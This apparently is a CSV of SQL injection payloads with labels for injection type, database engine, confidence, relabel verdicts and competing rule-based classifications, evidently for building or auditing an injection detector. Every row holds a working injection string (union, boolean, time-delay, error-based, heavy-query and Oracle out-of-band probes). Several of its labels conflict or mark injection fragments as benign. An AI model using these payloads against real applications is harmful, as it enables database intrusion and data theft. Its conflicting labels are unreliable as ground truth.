payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
1' where 4403 = 4403 rlike sleep ( 5 ) #,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,1' where 4403 = 4403 rlike sleep ( 5 ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""%"" = """,heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1, ( select ( case when ( 3743 = 9640 ) then 1 else 3743* ( select 3743 from master..sysdatabases ) end ) )",time_blind,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mssql,"1, ( select ( case when ( 3743 = 9640 ) then 1 else 3743* ( select 3743 from master..sysdatabases ) end ) )",False,0,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""eqmy"" = ""eqmy",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""eqmy"" = ""eqmy",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9111"" or 3038 = 3038",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-9111"" or 3038 = 3038",False,0,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) ) ) union all select null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) ) ) union all select null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" where 9829 = 9829 order by 1#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1"" where 9829 = 9829 order by 1#",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
-2022 ) ) ) or 6812 = 3516 and ( ( ( 3896 = 3896,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,-2022 ) ) ) or 6812 = 3516 and ( ( ( 3896 = 3896,False,0,boolean_blind,generic,Pattern match: 'or 6812 = 3516' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
-2505' or 9323 = 9323#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-2505' or 9323 = 9323#,False,0,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and '%' = '",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and '%' = '",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) as pwqs where 2291 = 2291,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,1' ) as pwqs where 2291 = 2291,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun,error_based,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars),error_based,oracle,-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun,False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"-7749"" or ( 2689 = 7481 ) *7481",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-7749"" or ( 2689 = 7481 ) *7481",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
1 ) ) and 2886 = 1133--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) ) and 2886 = 1133--,False,0,boolean_blind,generic,Pattern match: 'and 2886 = 1133' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
1 ) where 9307 = 9307,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) where 9307 = 9307,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"-4223' ) ) ) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-4223' ) ) ) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
select ( case when ( 1407 = 2741 ) then 1407 else 1407* ( select 1407 from mysql.db ) end ) #,error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,select ( case when ( 1407 = 2741 ) then 1407 else 1407* ( select 1407 from mysql.db ) end ) #,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9606 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # iuij",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"-9606 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # iuij",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
-6823' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'lwlk' like 'lwlk,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,-6823' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'lwlk' like 'lwlk,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
"1' where 2160 = 2160 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' where 2160 = 2160 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
-5820' ) ) as lkik where 4044 = 4044 or 7156 = 9197--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,-5820' ) ) as lkik where 4044 = 4044 or 7156 = 9197--,False,0,boolean_blind,generic,Pattern match: 'or 7156 = 9197' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""jcgh"" = ""jcgh",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""jcgh"" = ""jcgh",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
-5585' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars),error_based,oracle,-5585' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-4849"" ) ) or ( 5005 = 9111 ) *9111 and ( ( ""catv"" like ""catv",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"-4849"" ) ) or ( 5005 = 9111 ) *9111 and ( ( ""catv"" like ""catv",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'mbxh' like 'mbxh",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'mbxh' like 'mbxh",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" where 8732 = 8732",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" where 8732 = 8732",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',False,0,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
1' ) and 4822 = 6997 and ( 'ojku' = 'ojku,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) and 4822 = 6997 and ( 'ojku' = 'ojku,False,0,boolean_blind,generic,Pattern match: 'and 4822 = 6997' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
-7950' ) or 9323 = 9323#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-7950' ) or 9323 = 9323#,False,0,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""oyuj"" = ""oyuj",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""oyuj"" = ""oyuj",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'opyt' = 'opyt",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'opyt' = 'opyt",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
select pg_sleep ( 5 ) and ( ( '%' = ',time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,select pg_sleep ( 5 ) and ( ( '%' = ',False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1 where 2363 = 2363 union all select null,null,null,null,null--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1 where 2363 = 2363 union all select null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'rdpv' = 'rdpv",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'rdpv' = 'rdpv",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eqyr' like 'eqyr",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eqyr' like 'eqyr",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
"1%"" ) union all select null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%"" ) union all select null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ymnm' = 'ymnm,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ymnm' = 'ymnm,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"-3300' union all select 8979,8979,8979,8979,8979,8979--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-3300' union all select 8979,8979,8979,8979,8979,8979--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,False,0,boolean_blind,generic,Pattern match: 'and 4069 = 8786' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --,False,0,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal
-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
select pg_sleep ( 5 ),time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,select pg_sleep ( 5 ),False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
1' ) where 7903 = 7903,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 7903 = 7903,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
